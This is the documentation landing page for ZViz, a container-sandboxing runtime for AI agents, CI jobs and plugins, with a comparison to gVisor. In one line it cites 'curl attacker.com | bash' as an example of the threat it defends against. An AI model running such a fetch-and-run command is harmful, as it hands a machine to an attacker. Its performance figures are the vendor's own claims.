# ZViz

**Container isolation for code you can't trust but have to run.**

ZViz is a container runtime that provides strong security isolation with near-native performance. Built for the era of AI agents, untrusted dependencies, and multi-tenant workloads.

<div class="grid cards" markdown>

-   :material-robot:{ .lg .middle } __AI Agents & Untrusted Code__

    ---

    Sandbox LLM-generated code, third-party plugins, and autonomous agents

    [:octicons-arrow-right-24: Use Cases](#use-cases)

-   :material-shield-check:{ .lg .middle } __gVisor-Grade Security__

    ---

    98.2% policy compatibility, 19/19 escape tests blocked

    [:octicons-arrow-right-24: Security Model](architecture/threat-model.md)

-   :material-speedometer:{ .lg .middle } __Native Performance__

    ---

    4-249x faster syscalls than gVisor, ~8ms cold starts

    [:octicons-arrow-right-24: Performance](architecture/performance.md)

-   :material-kubernetes:{ .lg .middle } __Kubernetes Native__

    ---

    Drop-in RuntimeClass for existing clusters

    [:octicons-arrow-right-24: Kubernetes Guide](operator-guide/kubernetes.md)

</div>

## The Problem

You're running code you didn't write. Maybe it's:

- **AI agents** executing LLM-generated code (one prompt injection away from `curl attacker.com | bash`)
- **CI/CD pipelines** running `npm install` on packages with dozens of transitive dependencies you've never audited
- **Third-party plugins** that "need shell access" to work
- **Multi-tenant workloads** where one customer's code runs next to another's

Traditional containers give you a false sense of security. A container is just namespaces and cgroups - the kernel attack surface is still fully exposed. Every `runc` escape CVE is a reminder that "containerized" isn't a security strategy.

gVisor solves this with a userspace kernel that emulates syscalls. It works, but at a cost: 5-250x syscall overhead, ~200ms cold starts, and 50MB per container.

## The Solution

ZViz provides gVisor-grade isolation without the performance tax. Instead of emulating syscalls, it enforces security through layered kernel primitives:

```
gVisor:  App → Sentry (emulates ~300 syscalls) → Host kernel (~70 syscalls)
ZViz:    App → BPF filter → ALLOW (90, native speed) / DENY (22) / BROKER (5, mediated)
```

Allowed syscalls execute at native kernel speed. Dangerous syscalls get blocked immediately (EPERM) or routed through a userspace broker for inspection.

## Use Cases

### AI Agents & Agentic Workloads

| Scenario | Risk | ZViz Protection |
|----------|------|-----------------|
| **LLM code execution** | Prompt injection, hallucinated malware | Syscall filtering at kernel boundary |
| **Agent tool use** | Shell commands, file operations | Landlock LSM, broker mediation |
| **Agent spawning agents** | Recursive execution, resource exhaustion | cgroups v2 limits, PID caps |
| **Untrusted plugins** | Unknown third-party behavior | Full namespace isolation |

### Traditional Workloads

| Use Case | Why ZViz? |
|----------|-----------|
| **CI/CD Runners** | Isolated builds for untrusted code, ~8ms cold start |
| **Multi-tenant Platforms** | Strong tenant isolation, 25x better density than gVisor |
| **Plugin Execution** | Safe execution of third-party extensions |
| **Serverless / FaaS** | Fast startup, low memory overhead |

## Quick Example

```bash
# Run a container with the CI runner profile
zviz run --profile ci-runner my-build /bin/sh -c "npm install && npm test"

# Debug with verbose mode (see which syscalls get blocked)
zviz --verbose run my-container /path/to/bundle

# Use workload-specific profiles
zviz --profile=web-server run my-api /path/to/bundle
zviz --profile=batch-job run my-etl /path/to/bundle
```

## When to Use gVisor Instead

ZViz blocks dangerous syscalls outright. gVisor emulates them safely. Both achieve isolation, but the approach matters for compatibility:

| If your workload needs... | Use | Why |
|---------------------------|-----|-----|
| `ptrace` (strace, debuggers) | gVisor | ZViz blocks it |
| `mount` / `unshare` (Docker-in-Docker) | gVisor | Nested containers need namespace syscalls |
| Bazel / Nix builds | gVisor | Internal sandboxing creates namespaces |
| Maximum syscall performance | **ZViz** | Native speed vs emulation overhead |
| Fast cold starts (serverless) | **ZViz** | ~8ms vs ~200ms |
| Strictest policy | **ZViz** | Exploit code fails immediately |

**Simple rule**: If you need nested containers or process tracing, use gVisor. Otherwise, ZViz is faster and stricter.

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                         Container                                │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                    Application                           │    │
│  └─────────────────────────────────────────────────────────┘    │
│                              │                                   │
│                              │ syscall                           │
│                              ▼                                   │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │              Seccomp-BPF Filter                          │    │
│  │    ┌──────────┬──────────────┬─────────────────────┐    │    │
│  │    │  ALLOW   │    DENY      │  USER_NOTIF         │    │    │
│  │    │ (native) │  (blocked)   │  (mediated)         │    │    │
│  │    └──────────┴──────────────┴──────────┬──────────┘    │    │
│  └─────────────────────────────────────────│───────────────┘    │
└────────────────────────────────────────────│────────────────────┘
                                             │
                                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                      ZViz Broker                                │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  openat │ ioctl │ socket │ clone │ execve │ prctl       │    │
│  │         Argument validation + policy decision           │    │
│  └─────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

Five enforcement layers: Namespaces, Capabilities, Landlock LSM, Seccomp-BPF, cgroups v2.

## Getting Help

- **Documentation**: You're reading it!
- **GitHub Issues**: [github.com/AIntheSky/zviz/issues](https://github.com/AIntheSky/zviz/issues)
- **Security Issues**: See [Security Policy](security/index.md)

## License

ZViz is licensed under the Apache License 2.0.
